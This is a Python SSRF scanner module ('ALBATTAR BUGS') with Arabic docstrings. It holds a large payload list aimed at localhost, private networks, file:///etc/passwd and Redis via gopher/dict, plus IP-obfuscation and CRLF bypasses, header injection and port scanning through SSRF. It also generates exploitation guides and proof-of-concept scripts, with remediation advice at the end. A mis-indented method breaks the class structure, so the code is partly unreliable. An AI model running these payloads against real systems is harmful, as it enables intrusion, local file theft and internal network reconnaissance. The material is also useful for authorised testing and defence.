"""
╔══════════════════════════════════════════════════════════════╗
║         ⚔️  ALBATTAR BUGS - SSRF Scanner  ⚔️                ║
║              Created by ROBIN | @ll bUg                     ║
╚══════════════════════════════════════════════════════════════╝

Server-Side Request Forgery (SSRF) Scanner
------------------------------------------
يكتشف ثغرات SSRF في جميع أشكالها:
- Basic SSRF
- URL Parameter SSRF
- Header-based SSRF
- POST Data SSRF
- Protocol-based SSRF (file://, gopher://, dict://)
- SSRF to Internal Network
- SSRF to localhost
- Port Scanning via SSRF
"""

import re
import time
import socket
import requests
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.base_scanner import BaseScanner
from core.http_handler import HTTPHandler
from utils.logger import Logger
from utils.colors import Colors


class SSRFScanner(BaseScanner):
    """
    ماسح Server-Side Request Forgery المتقدم
    """
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        self.name = "SSRF Scanner"
        self.description = "Detects Server-Side Request Forgery vulnerabilities"
        self.severity = "CRITICAL"
        
        self.logger = Logger(__name__)
        self.colors = Colors()
        self.http_handler = HTTPHandler(config)
        
        # SSRF payloads
        self.ssrf_payloads = self._load_ssrf_payloads()
        
        # Internal IP ranges
        self.internal_ips = self._load_internal_ips()
        
        # Protocol handlers
        self.protocols = self._load_protocols()
        
        # Common internal services
        self.internal_services = self._load_internal_services()
        
        # SSRF bypass techniques
        self.bypass_techniques = self._load_bypass_techniques()
        
        # Results storage
        self.vulnerabilities = []
        
        # Statistics
        self.stats = {
            'total_tests': 0,
            'requests_sent': 0,
            'ssrf_found': 0,
            'internal_access': 0
        }
    
    def _load_ssrf_payloads(self) -> List[Dict]:
        """تحميل SSRF payloads"""
        return [
            # ═══════════════════════════════════════════════════
            # 1. Localhost Access
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://localhost",
                "type": "localhost",
                "description": "Access localhost",
                "port": None,
                "expected_response": ["It works", "Apache", "nginx", "Welcome"]
            },
            {
                "payload": "http://127.0.0.1",
                "type": "localhost",
                "description": "Access 127.0.0.1",
                "port": None,
                "expected_response": ["It works", "Apache", "nginx"]
            },
            {
                "payload": "http://0.0.0.0",
                "type": "localhost",
                "description": "Access 0.0.0.0",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://[::1]",
                "type": "localhost_ipv6",
                "description": "IPv6 localhost",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://localhost.localdomain",
                "type": "localhost",
                "description": "Localhost domain",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 2. Localhost with Ports
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://127.0.0.1:80",
                "type": "localhost_port",
                "description": "Localhost port 80",
                "port": 80,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:8080",
                "type": "localhost_port",
                "description": "Localhost port 8080",
                "port": 8080,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:443",
                "type": "localhost_port",
                "description": "Localhost port 443",
                "port": 443,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:3306",
                "type": "localhost_port",
                "description": "MySQL port",
                "port": 3306,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:6379",
                "type": "localhost_port",
                "description": "Redis port",
                "port": 6379,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:5432",
                "type": "localhost_port",
                "description": "PostgreSQL port",
                "port": 5432,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1:27017",
                "type": "localhost_port",
                "description": "MongoDB port",
                "port": 27017,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 3. Internal Network IPs
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://192.168.0.1",
                "type": "internal_network",
                "description": "Private network 192.168.0.1",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://192.168.1.1",
                "type": "internal_network",
                "description": "Private network 192.168.1.1",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://10.0.0.1",
                "type": "internal_network",
                "description": "Private network 10.0.0.1",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://172.16.0.1",
                "type": "internal_network",
                "description": "Private network 172.16.0.1",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 4. Protocol-based SSRF
            # ═══════════════════════════════════════════════════
            {
                "payload": "file:///etc/passwd",
                "type": "file_protocol",
                "description": "File protocol - Linux",
                "port": None,
                "expected_response": ["root:x:0:0"]
            },
            {
                "payload": "file:///c:/windows/win.ini",
                "type": "file_protocol",
                "description": "File protocol - Windows",
                "port": None,
                "expected_response": ["[fonts]"]
            },
            {
                "payload": "dict://127.0.0.1:6379/info",
                "type": "dict_protocol",
                "description": "Dict protocol to Redis",
                "port": 6379,
                "expected_response": ["redis_version"]
            },
            {
                "payload": "gopher://127.0.0.1:6379/_INFO",
                "type": "gopher_protocol",
                "description": "Gopher protocol to Redis",
                "port": 6379,
                "expected_response": []
            },
            {
                "payload": "ldap://127.0.0.1:389",
                "type": "ldap_protocol",
                "description": "LDAP protocol",
                "port": 389,
                "expected_response": []
            },
            {
                "payload": "tftp://127.0.0.1",
                "type": "tftp_protocol",
                "description": "TFTP protocol",
                "port": 69,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 5. URL Encoding Bypass
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://127.0.0.1",
                "type": "url_encoded",
                "description": "URL encoded localhost",
                "port": None,
                "encoded": "http%3A%2F%2F127.0.0.1",
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1",
                "type": "double_encoded",
                "description": "Double URL encoded",
                "port": None,
                "encoded": "http%253A%252F%252F127.0.0.1",
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 6. IP Obfuscation
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://2130706433",
                "type": "decimal_ip",
                "description": "Decimal IP (127.0.0.1)",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://0x7f000001",
                "type": "hex_ip",
                "description": "Hex IP (127.0.0.1)",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://0177.0.0.1",
                "type": "octal_ip",
                "description": "Octal IP (127.0.0.1)",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://127.1",
                "type": "short_ip",
                "description": "Short IP notation",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 7. DNS Rebinding
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://localtest.me",
                "type": "dns_rebinding",
                "description": "DNS rebinding to 127.0.0.1",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1.nip.io",
                "type": "dns_rebinding",
                "description": "nip.io DNS rebinding",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1.xip.io",
                "type": "dns_rebinding",
                "description": "xip.io DNS rebinding",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 8. @ Symbol Bypass
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://evil.com@127.0.0.1",
                "type": "at_bypass",
                "description": "@ symbol URL bypass",
                "port": None,
                "expected_response": []
            },
            {
                "payload": "http://127.0.0.1@evil.com",
                "type": "at_bypass",
                "description": "Reverse @ bypass",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 9. Redirect-based SSRF
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://redirect-here.com/redirect?url=http://127.0.0.1",
                "type": "redirect",
                "description": "Open redirect to localhost",
                "port": None,
                "expected_response": []
            },
            
            # ═══════════════════════════════════════════════════
            # 10. CRLF Injection in URL
            # ═══════════════════════════════════════════════════
            {
                "payload": "http://127.0.0.1%0d%0aHost:%20evil.com",
                "type": "crlf_injection",
                "description": "CRLF injection in URL",
                "port": None,
                "expected_response": []
            }
        ]
    
    def _load_internal_ips(self) -> Dict[str, List[str]]:
        """تحميل نطاقات IP الداخلية"""
        return {
            "class_a": [f"10.0.0.{i}" for i in range(1, 255)],
            "class_b": [f"172.16.0.{i}" for i in range(1, 255)],
            "class_c": [f"192.168.0.{i}" for i in range(1, 255)] + 
                       [f"192.168.1.{i}" for i in range(1, 255)],
            "localhost": ["127.0.0.1", "localhost", "0.0.0.0", "[::1]"]
        }
    
    def _load_protocols(self) -> List[str]:
        """تحميل البروتوكولات المدعومة"""
        return [
            "http://",
            "https://",
            "file://",
            "ftp://",
            "gopher://",
            "dict://",
            "ldap://",
            "tftp://",
            "jar://",
            "ssh2://",
            "expect://"
        ]
    
    def _load_internal_services(self) -> Dict[int, str]:
        """تحميل الخدمات الداخلية الشائعة"""
        return {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
            445: "SMB",
            3306: "MySQL",
            3389: "RDP",
            5432: "PostgreSQL",
            5900: "VNC",
            6379: "Redis",
            8080: "HTTP-Proxy",
            8443: "HTTPS-Alt",
            9200: "Elasticsearch",
            27017: "MongoDB"
        }
    
    def _load_bypass_techniques(self) -> List[Dict]:
        """تحميل تقنيات التجاوز"""
        return [
            {
                "name": "URL Encoding",
                "technique": lambda url: quote(url, safe=''),
                "description": "URL encode the payload"
            },
            {
                "name": "Double Encoding",
                "technique": lambda url: quote(quote(url, safe=''), safe=''),
                "description": "Double URL encoding"
            },
            {
                "name": "Decimal IP",
                "technique": self._ip_to_decimal,
                "description": "Convert IP to decimal"
            },
            {
                "name": "Hex IP",
                "technique": self._ip_to_hex,
                "description": "Convert IP to hexadecimal"
            },
            {
                "name": "Octal IP",
                "technique": self._ip_to_octal,
                "description": "Convert IP to octal"
            }
        ]
    
    def _ip_to_decimal(self, ip: str) -> str:
        """تحويل IP إلى decimal"""
        try:
            if "://" in ip:
                parts = ip.split("://")
                protocol = parts[0] + "://"
                ip_only = parts[1].split("/")[0].split(":")[0]
            else:
                protocol = ""
                ip_only = ip.split("/")[0].split(":")[0]
            
            octets = ip_only.split(".")
            if len(octets) == 4:
                decimal = int(octets[0]) * 16777216 + int(octets[1]) * 65536 + \
                         int(octets[2]) * 256 + int(octets[3])
                return f"{protocol}{decimal}"
        except:
            pass
        return ip
    
    def _ip_to_hex(self, ip: str) -> str:
        """تحويل IP إلى hex"""
        try:
            if "://" in ip:
                parts = ip.split("://")
                protocol = parts[0] + "://"
                ip_only = parts[1].split("/")[0].split(":")[0]
            else:
                protocol = ""
                ip_only = ip.split("/")[0].split(":")[0]
            
            octets = ip_only.split(".")
            if len(octets) == 4:
                hex_ip = "0x" + "".join([f"{int(octet):02x}" for octet in octets])
                return f"{protocol}{hex_ip}"
        except:
            pass
        return ip
    
    def _ip_to_octal(self, ip: str) -> str:
        """تحويل IP إلى octal"""
        try:
            if "://" in ip:
                parts = ip.split("://")
                protocol = parts[0] + "://"
                ip_only = parts[1].split("/")[0].split(":")[0]
            else:
                protocol = ""
                ip_only = ip.split("/")[0].split(":")[0]
            
            octets = ip_only.split(".")
            if len(octets) == 4:
                octal_parts = [f"0{int(octet):o}" for octet in octets]
                return f"{protocol}{'.'.join(octal_parts)}"
        except:
            pass
        return ip
    
    def scan(self) -> List[Dict]:
        """
        بدء فحص SSRF
        """
        self.logger.info(f"{self.colors.BLUE}Starting SSRF scan on {self.target}{self.colors.RESET}")
        
        try:
            # 1. Test basic SSRF
            self._test_basic_ssrf()
            
            # 2. Test localhost access
            self._test_localhost_access()
            
            # 3. Test internal network access
            self._test_internal_network()
            
            # 4. Test protocol-based SSRF
            self._test_protocol_ssrf()
            
            # 5. Test bypass techniques
            self._test_bypass_techniques()
            
            # 6. Test port scanning
            self._test_port_scanning()
            
            # 7. Test header-based SSRF
            self._test_header_ssrf()
            
            self.logger.info(
                f"{self.colors.GREEN}SSRF scan complete. "
                f"Found {len(self.vulnerabilities)} vulnerabilities{self.colors.RESET}"
            )
            
        except Exception as e:
            self.logger.error(f"Error during SSRF scan: {str(e)}")
        
        return self.vulnerabilities
    
    def _test_basic_ssrf(self):
        """اختبار SSRF الأساسي"""
        self.logger.info("Testing basic SSRF...")
        
        params = self._extract_parameters()
        
        if not params:
            self.logger.warning("No parameters found in URL")
            return
        
        for param in params:
            for payload_data in self.ssrf_payloads[:10]:  # Test first 10
                self._test_parameter(param, payload_data)
                time.sleep(0.3)
    
    def _test_parameter(self, param: str, payload_data: Dict):
        """اختبار parameter معين"""
        try:
            payload = payload_data.get("encoded", payload_data["payload"])
            
            # Build test URL
            test_url = self._build_test_url(param, payload)
            
            # Send request
            response = self.http_handler.get(test_url, timeout=10)
            self.stats['requests_sent'] += 1
            
            if response:
                # Check for SSRF indicators
                if self._check_ssrf_success(response, payload_data):
                    self._report_vulnerability(
                        param=param,
                        payload=payload,
                        response=response,
                        payload_data=payload_data,
                        test_url=test_url
                    )
                    self.stats['ssrf_found'] += 1
                    
        except Exception as e:
            self.logger.debug(f"Error testing parameter {param}: {str(e)}")
    
    def _test_localhost_access(self):
        """اختبار الوصول إلى localhost"""
        self.logger.info("Testing localhost access...")
        
        params = self._extract_parameters()
        localhost_payloads = [p for p in self.ssrf_payloads if p["type"] == "localhost"]
        
        for param in params:
            for payload_data in localhost_payloads:
                self._test_parameter(param, payload_data)
                time.sleep(0.3)
    
    def _test_internal_network(self):
        """اختبار الوصول إلى الشبكة الداخلية"""
        self.logger.info("Testing internal network access...")
        
        params = self._extract_parameters()
        internal_payloads = [p for p in self.ssrf_payloads if p["type"] == "internal_network"]
        
        for param in params:
            for payload_data in internal_payloads:
                self._test_parameter(param, payload_data)
                time.sleep(0.3)
    
    def _test_protocol_ssrf(self):
        """اختبار SSRF عبر بروتوكولات مختلفة"""
        self.logger.info("Testing protocol-based SSRF...")
        
        params = self._extract_parameters()
        protocol_payloads = [p for p in self.ssrf_payloads 
                           if "protocol" in p["type"]]
        
        for param in params:
            for payload_data in protocol_payloads:
                self._test_parameter(param, payload_data)
                time.sleep(0.3)
    
    def _test_bypass_techniques(self):
        """اختبار تقنيات التجاوز"""
        self.logger.info("Testing SSRF bypass techniques...")
        
        params = self._extract_parameters()
        
        for param in params:
            base_url = "http://127.0.0.1"
            
            for bypass in self.bypass_techniques:
                try:
                    bypassed_url = bypass["technique"](base_url)
                    
                    test_url = self._build_test_url(param, bypassed_url)
                    response = self.http_handler.get(test_url, timeout=10)
                    self.stats['requests_sent'] += 1
                    
                    if response and self._looks_like_internal_response(response):
                        self._report_vulnerability(
                            param=param,
                            payload=bypassed_url,
                            response=response,
                            bypass_technique=bypass["name"],
                            test_url=test_url
                        )
                        
                    time.sleep(0.3)
                    
                except Exception as e:
                    self.logger.debug(f"Error testing bypass: {str(e)}")
    
    def _test_port_scanning(self):
        """اختبار Port Scanning عبر SSRF"""
        self.logger.info("Testing port scanning via SSRF...")
        
        params = self._extract_parameters()
        common_ports = [21, 22, 23, 25, 80, 443, 3306, 6379, 8080, 27017]
        
        for param in params:
            for port in common_ports:
                try:
                    payload = f"http://127.0.0.1:{port}"
                    test_url = self._build_test_url(param, payload)
                    
                    start_time = time.time()
                    response = self.http_handler.get(test_url, timeout=5)
                    response_time = time.time() - start_time
                    
                    self.stats['requests_sent'] += 1
                    
                    # Port is open if we get a response or specific timeout
                    if response or (response_time > 4):
                        service = self.internal_services.get(port, "Unknown")
                        self._report_vulnerability(
                            param=param,
                            payload=payload,
                            response=response,
                            port=port,
                            service=service,
                            attack_type="Port Scanning via SSRF",
                            test_url=test_url
                        )
                        
                    time.sleep(0.2)
                    
                except Exception as e:
                    self.logger.debug(f"Error scanning port {port}: {str(e)}")
    
    def _test_header_ssrf(self):
        """اختبار SSRF عبر Headers"""
        self.logger.info("Testing header-based SSRF...")
        
        ssrf_headers = {
            "X-Forwarded-For": "http://127.0.0.1",
            "X-Forwarded-Host": "127.0.0.1",
            "X-Original-URL": "http://127.0.0.1",
            "X-Rewrite-URL": "http://127.0.0.1",
            "Referer": "http://127.0.0.1",
            "X-Custom-IP-Authorization": "127.0.0.1",
            "X-Originating-IP": "127.0.0.1",
            "X-Remote-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Host": "127.0.0.1"
        }
        
        for header_name, header_value in ssrf_headers.items():
            try:
                response = self.http_handler.get(
                    self.target,
                    headers={header_name: header_value},
                    timeout=10
                )
                
                self.stats['requests_sent'] += 1
                
                if response and self._looks_like_internal_response(response):
                    self._report_vulnerability(
                        header=header_name,
                        payload=header_value,
                        response=response,
                        attack_type="Header-based SSRF"
                    )
                    
                time.sleep(0.3)
                
            except Exception as e:
                self.logger.debug(f"Error testing header {header_name}: {str(e)}")
    
    def _extract_parameters(self) -> List[str]:
        """استخراج Parameters من URL"""
        params = []
        
        if "?" in self.target:
            query_string = self.target.split("?")[1]
            for param_pair in query_string.split("&"):
                if "=" in param_pair:
                    param_name = param_pair.split("=")[0]
                    params.append(param_name)
        
        return params
def _build_test_url(self, param: str, payload: str) -> str:
    """بناء URL الاختبار"""
    if "?" not in self.target:
        return f"{self.target}?{param}={payload}"
    
    base_url = self.target.split("?")[0]
    query_params = []
    
    for param_pair in self.target.split("?")[1].split("&"):
        if "=" in param_pair:
            param_name, param_value = param_pair.split("=", 1)
            if param_name == param:
                query_params.append(f"{param_name}={payload}")
            else:
                query_params.append(param_pair)
    
    return f"{base_url}?{'&'.join(query_params)}"
    def _check_ssrf_success(self, response, payload_data: Dict) -> bool:
        """التحقق من نجاح SSRF"""
        if not response:
            return False
        
        # Check expected responses
        expected_responses = payload_data.get("expected_response", [])
        for expected in expected_responses:
            if expected and expected.lower() in response.text.lower():
                return True
        
        # Check for internal service indicators
        if self._looks_like_internal_response(response):
            return True
        
        return False
    
    def _looks_like_internal_response(self, response) -> bool:
        """التحقق من أن الاستجابة تبدو داخلية"""
        internal_indicators = [
            # Web servers
            "apache", "nginx", "iis", "lighttpd",
            # Default pages
            "it works", "welcome to", "test page",
            # System info
            "localhost", "127.0.0.1", "internal",
            # Services
            "redis", "mysql", "postgresql", "mongodb",
            "elasticsearch", "memcached",
            # Error messages
            "connection refused", "connection timeout",
            "network unreachable",
            # File contents
            "root:x:0:0", "[fonts]", "PATH="
        ]
        
        response_text = response.text.lower()
        
        for indicator in internal_indicators:
            if indicator in response_text:
                return True
        
        # Check response headers
        if response.headers:
            server_header = response.headers.get('Server', '').lower()
            if any(s in server_header for s in ['apache', 'nginx', 'iis']):
                return True
        
        return False
    
    def _report_vulnerability(self, **kwargs):
        """تسجيل ثغرة مكتشفة"""
        
        vulnerability = {
            "type": "Server-Side Request Forgery (SSRF)",
            "severity": "CRITICAL",
            "url": self.target,
            "confidence": self._calculate_confidence(kwargs),
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "cvss_score": 9.1,
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery"
        }
        
        # Add all kwargs to vulnerability
        vulnerability.update(kwargs)
        
        # Add response details if available
        if 'response' in kwargs and kwargs['response']:
            response = kwargs['response']
            vulnerability['response_details'] = {
                'status_code': response.status_code,
                'length': len(response.text),
                'headers': dict(response.headers),
                'response_snippet': response.text[:500]
            }
        
        # Add exploitation guide
        vulnerability['exploitation'] = self._generate_exploitation_guide(vulnerability)
        
        # Add remediation
        vulnerability['remediation'] = self._generate_remediation(vulnerability)
        
        # Add impact assessment
        vulnerability['impact'] = self._assess_impact(vulnerability)
        
        self.vulnerabilities.append(vulnerability)
        
        self.logger.warning(
            f"{self.colors.RED}[VULN FOUND] SSRF Detected!{self.colors.RESET}\n"
            f"  Location: {kwargs.get('param', kwargs.get('header', 'Unknown'))}\n"
            f"  Payload: {kwargs.get('payload', 'N/A')[:80]}...\n"
            f"  Confidence: {vulnerability['confidence']}%"
        )
    
    def _calculate_confidence(self, details: Dict) -> int:
        """حساب نسبة الثقة"""
        confidence = 70  # Base confidence
        
        # If we got internal response
        if details.get('response'):
            confidence += 15
        
        # If bypass technique worked
        if details.get('bypass_technique'):
            confidence += 10
        
        # If port scanning successful
        if details.get('port'):
            confidence += 5
        
        return min(confidence, 99)
    
    def _generate_exploitation_guide(self, vuln: Dict) -> Dict:
        """توليد دليل الاستغلال"""
        
        guide = {
            "difficulty": "Medium",
            "requirements": [
                "Understanding of SSRF",
                "Knowledge of internal network architecture",
                "Ability to identify internal services"
            ],
            "steps": []
        }
        
        if vuln.get('param'):
            guide["steps"] = [
                f"1. Target parameter: {vuln['param']}",
                f"2. Inject SSRF payload: {vuln['payload']}",
                "3. Server makes request to internal resource",
                "4. Response contains internal data",
                "5. Extract sensitive information or pivot to internal network"
            ]
        elif vuln.get('header'):
            guide["steps"] = [
                f"1. Target header: {vuln['header']}",
                f"2. Set header value: {vuln['payload']}",
                "3. Server processes header as URL",
                "4. Internal request is made",
                "5. Exploit internal services"
            ]
        
        # Add specific attack scenarios
        guide["attack_scenarios"] = [
            "Access internal admin panels",
            "Scan internal network ports",
            "Read local files (file:// protocol)",
            "Access cloud metadata (AWS, Azure, GCP)",
            "Interact with internal services (Redis, MySQL, etc)",
            "Bypass authentication/authorization",
            "Port forwarding to internal services"
        ]
        
        # Add PoC
        guide["poc_code"] = self._generate_poc_code(vuln)
        
        return guide
    
    def _generate_poc_code(self, vuln: Dict) -> str:
        """توليد Proof of Concept"""
        
        if vuln.get('param'):
            return f"""
# SSRF Proof of Concept
# Target: {vuln['url']}

import requests

# Basic SSRF
url = "{vuln.get('test_url', vuln['url'])}"
response = requests.get(url)
print(response.text)

# Port scanning via SSRF
target_param = "{vuln.get('param', 'url')}"
base_url = "{vuln['url'].split('?')[0]}"

common_ports = [80, 443, 3306, 6379, 8080, 27017]
for port in common_ports:
    payload = f"http://127.0.0.1:{{port}}"
    test_url = f"{{base_url}}?{{target_param}}={{payload}}"
    try:
        resp = requests.get(test_url, timeout=5)
        if resp.status_code == 200:
            print(f"Port {{port}}: OPEN")
    except:
        print(f"Port {{port}}: CLOSED")

# Access internal services
payloads = [
    "http://localhost",
    "http://127.0.0.1:8080",
    "http://192.168.1.1",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379/info"
]

for payload in payloads:
    test_url = f"{{base_url}}?{{target_param}}={{payload}}"
    resp = requests.get(test_url)
    print(f"Payload: {{payload}}")
    print(f"Response: {{resp.text[:200]}}...")
    print("-" * 50)
"""
        
        elif vuln.get('header'):
            return f"""
# Header-based SSRF Proof of Concept
# Target: {vuln['url']}

import requests

headers = {{
    "{vuln.get('header', 'X-Forwarded-For')}": "{vuln.get('payload', 'http://127.0.0.1')}"
}}

response = requests.get("{vuln['url']}", headers=headers)
print(response.text)
"""
        
        return "# PoC not available"
    
    def _generate_remediation(self, vuln: Dict) -> Dict:
        """توليد توصيات الإصلاح"""
        
        return {
            "priority": "CRITICAL",
            "recommendations": [
                "Implement strict input validation for URLs",
                "Use allowlist of permitted domains/IPs",
                "Block access to private IP ranges (RFC 1918)",
                "Disable unnecessary URL schemes (file://, gopher://, etc)",
                "Implement proper DNS resolution validation",
                "Use network segmentation",
                "Monitor outbound requests from application servers",
                "Implement timeout for external requests"
            ],
            "code_examples": {
                "vulnerable": """
# ❌ VULNERABLE CODE
def fetch_url(url):
    response = requests.get(url)
    return response.text
""",
                "secure": """
# ✅ SECURE CODE
import ipaddress
from urllib.parse import urlparse

ALLOWED_DOMAINS = ['example.com', 'api.example.com']
BLOCKED_IP_RANGES = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8')
]

def is_safe_url(url):
    # Parse URL
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check domain allowlist
    if parsed.netloc not in ALLOWED_DOMAINS:
        return False
    
    # Resolve and check IP
    try:
        ip = socket.gethostbyname(parsed.netloc)
        ip_obj = ipaddress.ip_address(ip)
        
        # Block private IPs
        for blocked_range in BLOCKED_IP_RANGES:
            if ip_obj in blocked_range:
                return False
    except:
        return False
    
    return True

def fetch_url(url):
    if not is_safe_url(url):
        raise ValueError("Unsafe URL detected")
    
    response = requests.get(url, timeout=5)
    return response.text
"""
            },
            "references": [
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf",
                "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                "https://cwe.mitre.org/data/definitions/918.html"
            ]
        }
    
    def _assess_impact(self, vuln: Dict) -> Dict:
        """تقييم تأثير الثغرة"""
        
        return {
            "confidentiality": "HIGH",
            "integrity": "HIGH",
            "availability": "MEDIUM",
            "scope": "Changed",
            "description": (
                "SSRF allows attackers to make the server perform requests to "
                "arbitrary destinations, potentially accessing internal resources, "
                "bypassing firewalls, and compromising internal services. This can "
                "lead to data theft, service compromise, and lateral movement within "
                "the internal network."
            ),
            "business_impact": [
                "Access to internal systems and services",
                "Data exfiltration from internal resources",
                "Cloud metadata access (AWS keys, etc)",
                "Internal network mapping and reconnaissance",
                "Bypass of network security controls",
                "Potential for complete infrastructure compromise"
            ],
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N",
            "cvss_breakdown": {
                "Attack Vector": "Network (AV:N)",
                "Attack Complexity": "Low (AC:L)",
                "Privileges Required": "None (PR:N)",
                "User Interaction": "None (UI:N)",
                "Scope": "Changed (S:C)",
                "Confidentiality": "High (C:H)",
                "Integrity": "High (I:H)",
                "Availability": "None (A:N)"
            }
        }
    
    def generate_report(self) -> Dict:
        """توليد تقرير شامل"""
        
        return {
            "scanner": self.name,
            "target": self.target,
            "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "total_vulnerabilities": len(self.vulnerabilities),
            "vulnerabilities": self.vulnerabilities,
            "statistics": self.stats,
            "summary": self._generate_summary(),
            "recommendations": self._generate_general_recommendations()
        }
    
    def _generate_summary(self) -> str:
        """توليد ملخص الفحص"""
        
        if not self.vulnerabilities:
            return "No SSRF vulnerabilities detected."
        
        summary = f"""
SSRF Scan Summary:
------------------
Total Vulnerabilities Found: {len(self.vulnerabilities)}
Internal Access: {self.stats['internal_access']}
Total Requests: {self.stats['requests_sent']}

Critical Findings:
"""
        for i, vuln in enumerate(self.vulnerabilities[:5], 1):
            summary += f"\n{i}. {vuln.get('attack_type', 'SSRF')}"
            if vuln.get('param'):
                summary += f" via parameter '{vuln['param']}'"
            elif vuln.get('header'):
                summary += f" via header '{vuln['header']}'"
            summary += f"\n   Payload: {vuln.get('payload', 'N/A')[:80]}"
            summary += "\n"
        
        return summary
    
    def _generate_general_recommendations(self) -> List[str]:
        """توليد توصيات عامة"""
        
        return [
            "1. Implement URL allowlist - only permit known safe domains",
            "2. Block private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
            "3. Disable unused URL schemes (file://, gopher://, dict://, etc)",
            "4. Validate and sanitize all user-supplied URLs",
            "5. Use DNS resolution validation before making requests",
            "6. Implement network segmentation to limit blast radius",
            "7. Monitor and log all outbound requests",
            "8. Use timeout and rate limiting for external requests",
            "9. Disable HTTP redirects or validate redirect targets",
            "10. Apply principle of least privilege to application servers"
        ]


# ═══════════════════════════════════════════════════════════════
#                          USAGE EXAMPLE
# ═══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    """
    مثال على الاستخدام
    """
    
    # Configuration
    config = {
        "timeout": 10,
        "user_agent": "AlBaTTaR-BUGS/1.0 (SSRF Scanner)",
        "verify_ssl": False
    }
    
    # Target
    target = "https://example.com/fetch?url=https://google.com"
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║           ⚔️  ALBATTAR BUGS - SSRF Scanner  ⚔️              ║
║                Created by ROBIN | @ll bUg                   ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Initialize scanner
    scanner = SSRFScanner(target, config)
    
    # Run scan
    print(f"\n[*] Starting SSRF scan on: {target}\n")
    vulnerabilities = scanner.scan()
    
    # Generate report
    report = scanner.generate_report()
    
    # Display results
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n{Colors.RED}[!] Found {len(vulnerabilities)} SSRF vulnerabilities{Colors.RESET}\n")
        
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"{i}. {vuln.get('attack_type', 'SSRF')}")
            print(f"   Confidence: {vuln['confidence']}%")
            if vuln.get('param'):
                print(f"   Parameter: {vuln['param']}")
            if vuln.get('payload'):
                print(f"   Payload: {vuln['payload'][:80]}...")
            print()
    else:
        print(f"\n{Colors.GREEN}[✓] No SSRF vulnerabilities found{Colors.RESET}\n")
    
    print(report['summary'])